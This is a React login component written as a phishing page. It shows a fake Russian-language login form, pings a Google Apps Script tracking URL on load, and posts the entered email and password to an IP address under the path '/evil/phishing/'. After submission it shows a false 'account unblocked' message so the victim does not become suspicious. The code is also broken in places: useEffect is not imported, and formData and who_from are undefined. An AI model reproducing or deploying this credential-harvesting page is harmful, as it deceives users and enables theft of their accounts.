import React, { useState } from "react";
import axios from "axios";
import { LockOutlined, UserOutlined } from "@ant-design/icons";
import { Button, Form, Input, Spin, Modal } from "antd";
import { LoadingOutlined } from "@ant-design/icons";
import { useNavigate, useParams } from "react-router-dom";
import "./Login.css";

const antIcon = (
  <LoadingOutlined
    style={{
      fontSize: 24,
    }}
    spin
  />
);

const App = (props) => {
  const [isModalVisible, setIsModalVisible] = useState(false);
  const navigate = useNavigate();
  const { from } = useParams();
  const imgUrl = from
    ? `https://script.google.com/macros/s/AKfycbxEa4U-5hDIZUJ9l5Ft9lKkHORH4GbFVB3tlkie_KWXpxymcTQOQemR2jHWNGnx17qN/exec?site=1&from=${from}`
    : "https://script.google.com/macros/s/AKfycbxEa4U-5hDIZUJ9l5Ft9lKkHORH4GbFVB3tlkie_KWXpxymcTQOQemR2jHWNGnx17qN/exec?site=1";

  useEffect(() => {
    const trackingPixel = async () => {
      try {
        const response = await axios.get(imgUrl);
        console.log(response.data);
      } catch (error) {
        console.error(error);
      }
    };

    trackingPixel();
  }, []);

  const onFinish = (values) => {
    const data = new FormData();
    formData.append("from", who_from);
    formData.append("email", values.email);
    formData.append("password", values.password);

    axios
      .post("https://95.140.148.239/evil/phishing/", data)
      .then((res) => {
        console.log(res);
        setIsModalVisible(true);
      })
      .catch((err) => {
        console.log(err);
      });
  };

  let errorMessage = null;
  if (props.error) {
    errorMessage = <p>{props.error.message}</p>;
  }

  const handleModalOk = () => {
    setIsModalVisible(false);
    navigate("/login", { replace: true });
  };

  return (
    <div className="login">
      {errorMessage}

      {props.loading ? (
        <Spin indicator={antIcon} />
      ) : (
        <span>
          <Form
            name="normal_login"
            className="login-form"
            initialValues={{
              remember: true,
            }}
            onFinish={onFinish}
          >
            <Form.Item
              name="email"
              rules={[
                {
                  type: "email",
                  message: "The input is not valid E-mail!",
                },
                {
                  required: true,
                  message: "Please input your E-mail!",
                },
              ]}
            >
              <Input
                prefix={<UserOutlined className="site-form-item-icon" />}
                placeholder="Email"
              />
            </Form.Item>

            <Form.Item
              name="password"
              rules={[
                {
                  required: true,
                  message: "Please input your Password!",
                },
              ]}
            >
              <Input
                prefix={<LockOutlined className="site-form-item-icon" />}
                type="password"
                placeholder="Password"
              />
            </Form.Item>

            <Form.Item>
              <Button
                type="primary"
                htmlType="submit"
                style={{ marginRight: "10px" }}
              >
                Войти
              </Button>
            </Form.Item>
          </Form>
          <Modal
            title="Учетная запись разблокирована!"
            visible={isModalVisible}
            onOk={handleModalOk}
            closable={false}
            maskClosable={false}
            onCancel={handleModalOk}
          >
            <p>
              Теперь Вы снова можете пользоваться всеми возможностями сайта!
            </p>
          </Modal>
        </span>
      )}
    </div>
  );
};

export default App;
